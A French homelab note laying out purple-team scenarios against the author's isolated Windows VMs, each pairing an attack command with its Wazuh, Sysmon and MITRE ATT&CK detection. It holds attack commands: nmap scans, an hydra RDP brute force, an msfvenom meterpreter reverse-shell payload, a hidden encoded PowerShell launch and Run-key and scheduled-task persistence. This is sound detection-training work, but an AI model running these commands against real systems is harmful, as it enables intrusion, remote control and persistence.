---
tags: [homelab, soc, red-vs-blue, purple-team, mitre-attack, wazuh, atomic-red-team]
projet: "[[SOC Homelab]]"
date: 2026-11-19
statut: prêt à jouer
portée: "Labo isolé uniquement — VMnet2 10.10.10.0/24 et 10.20.20.0/24"
---

# SOC Homelab — Scénarios Red vs Blue (purple team)

## Résumé
Scénarios d'attaque prêts à jouer **contre mes propres VM de labo isolées**, chacun mappé à sa détection côté Blue. Le but n'est pas « réussir l'attaque » mais **générer de la télémétrie et valider que Wazuh la voit**. Chaque scénario suit le modèle : objectif → commande Red (outils publics standards) → artefact attendu → détection Blue ([[MITRE ATT&CK]] + Event ID + règle [[Wazuh]]). Inspiré d'**Atomic Red Team**, qu'on peut d'ailleurs rejouer tel quel pour compléter.

> [!warning] Périmètre
> Tout ce qui suit s'exécute **uniquement** dans `10.10.10.0/24` / `10.20.20.0/24` sur VMnet2 host-only. Cibles = mes VM Win11_target. Jamais de système réel, jamais le réseau maison, jamais la machine hôte. Snapshot avant, restauration après.

## Concepts clés
- **Télémétrie d'abord** : Round 1 avec Defender OFF pour que les logs sortent proprement, puis ON pour durcir.
- **Chaque action est horodatée** par le Red → le Blue corrèle à l'aveugle (sans voir la console attaquante).
- **Prérequis de visibilité** (à finir avant de jouer) :
  - [[Sysmon]] installé (config SwiftOnSecurity) + canal `Microsoft-Windows-Sysmon/Operational` ajouté au `ossec.conf`
  - Audit *Process Creation* **avec ligne de commande** (4688), *Logon* (4624/4625), *Account Management* (4720/4732)
  - PowerShell *Script Block Logging* (4104)

```xml
<!-- ossec.conf sur Win11_target : remonter Sysmon + PowerShell -->
<localfile>
  <location>Microsoft-Windows-Sysmon/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
<localfile>
  <location>Microsoft-Windows-PowerShell/Operational</location>
  <log_format>eventchannel</log_format>
</localfile>
```

---

## Préparation de la cible (une fois)
Comptes de labo volontairement faibles, créés exprès pour l'exercice :
```powershell
# Sur Win11_target, en admin — comptes JETABLES de labo
net user labuser 'Lab-Weak-2026!' /add
net localgroup "Remote Desktop Users" labuser /add
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

---

## Scénario A — Reconnaissance réseau
**Objectif Red** : cartographier la cible.
```bash
# depuis la Kali de l'attaquant
nmap -sS -sV -p- 10.10.10.20
nmap --script smb-enum-shares,smb-os-discovery -p445 10.10.10.20
```
**Artefacts** : rafale de connexions/refus, scan de ports.
**Détection Blue**
| Quoi | Où |
|---|---|
| MITRE | T1046 Network Service Discovery, T1018 |
| Windows | Filtering Platform 5156/5157 (si audit pare-feu activé) |
| Wazuh | Nombreuses connexions depuis une même IP `100.x` en peu de temps → règle de corrélation par fréquence |
| Idée de règle | `group: recon` sur un seuil de connexions distinctes/minute depuis une source |

---

## Scénario B — Accès initial par RDP (brute force ciblé)
**Objectif Red** : ouvrir une session avec un mot de passe faible.
```bash
# liste courte et ciblée, pas un rockyou complet — on veut un signal propre
hydra -t 1 -V -l labuser -P passwords-court.txt rdp://10.10.10.20
```
**Artefacts** : plusieurs 4625 puis un 4624.
**Détection Blue**
| Quoi | Où |
|---|---|
| MITRE | T1110.001 Brute Force, T1021.001 RDP |
| Windows | 4625 (échecs) × N, puis 4624 type 10 (RDP) |
| Wazuh | Règles natives `60122`/`60204` (authentification Windows) ; corrélation « N échecs puis succès même compte » |
| Validation | Alerte de niveau ≥ 10 dans le dashboard, IP source = vraie IP Tailscale de l'ami |

---

## Scénario C — Exécution et prise de pied
**Objectif Red** : exécuter du code après la session.
```bash
# Metasploit, payload de test de labo
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.20.20.50 LPORT=4444 -f exe -o lab_demo.exe
# transfert via la session RDP, puis exécution sur la cible
```
```powershell
# variante « living off the land » à détecter aussi
powershell -nop -w hidden -enc <base64_de_labo>
```
**Détection Blue**
| Quoi | Où |
|---|---|
| MITRE | T1059.001 PowerShell, T1204 User Execution |
| Sysmon | Event ID 1 (process create) avec parent anormal, 3 (connexion réseau sortante) |
| PowerShell | 4104 avec `-enc` / `hidden` / `-nop` |
| Wazuh | Règles Sysmon ; signature sur ligne de commande encodée |
| Note | C'est le round qui justifie Sysmon : sans lui, l'Event 4688 seul est pauvre |

---

## Scénario D — Persistance
**Objectif Red** : survivre à un redémarrage.
```powershell
# clé Run (technique bruyante, faite pour être vue)
New-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name LabDemo -Value 'C:\Users\labuser\lab_demo.exe'
# tâche planifiée
schtasks /create /tn "LabDemo" /tr "C:\Users\labuser\lab_demo.exe" /sc onlogon
```
**Détection Blue**
| Quoi | Où |
|---|---|
| MITRE | T1547.001 Run Keys, T1053.005 Scheduled Task |
| Windows | 4698 (tâche créée) |
| Sysmon | 13 (modification de registre), 11 (création de fichier) |
| Wazuh | Règle sur création de tâche planifiée ; surveillance FIM de la clé Run |

---

## Scénario E — Accès aux identifiants (Defender ON)
**Objectif Red** : tester si la défense bloque, et quelle trace reste.
```powershell
# technique archi-connue → doit déclencher Defender quand il est réactivé
# (laisser Defender la bloquer fait partie du test)
```
**Détection Blue**
| Quoi | Où |
|---|---|
| MITRE | T1003.001 LSASS Memory |
| Defender | 1116/1117 (Windows Defender - détection/action) |
| Sysmon | 10 (ProcessAccess ciblant lsass.exe, GrantedAccess 0x1010/0x1410) |
| Wazuh | Alerte Defender + règle Sysmon 10 sur lsass |
| Objectif pédagogique | Comparer round Defender OFF vs ON : ce qui passe, ce qui est bloqué, ce qui reste visible |

---

## Barème de détection (ce qui va dans le portfolio)
Pour chaque scénario, le Blue remplit :

| Champ | Exemple |
|---|---|
| Heure détectée vs heure réelle | écart de corrélation |
| Alerte Wazuh (règle, niveau) | `5710 / niveau 5` |
| Event IDs observés | 4625 ×12, 4624 |
| Technique ATT&CK | T1110.001 |
| Détecté ? Oui/Non/Partiel | Partiel (vu le succès, raté la phase brute) |
| Amélioration | baisser le seuil, ajouter une règle de corrélation |

## Rapport d'incident — modèle
```markdown
# Incident – Round N – <date>
## Résumé exécutif
## Chronologie (heure | source | action | détection)
## Techniques ATT&CK observées
## Preuves (captures Wazuh, IP masquées)
## Ce qui a été détecté / manqué
## Recommandations de détection (nouvelles règles, tuning)
```

## Déroulé d'une séance
1. Snapshots des deux côtés
2. Red annonce « début de round » + lance Atomic Red Team ou les scénarios ci-dessus, en horodatant
3. Blue surveille Wazuh à l'aveugle et remplit le barème
4. Débrief : comparer les chronologies, écrire le rapport
5. Restaurer les snapshots, inverser les rôles

## Liens
- [[SOC Homelab - Avancement et scénario]]
- [[Lab VPN - Tailscale Red vs Blue]]
- [[Wazuh]] · [[Sysmon]] · [[MITRE ATT&CK]] · [[Atomic Red Team]]
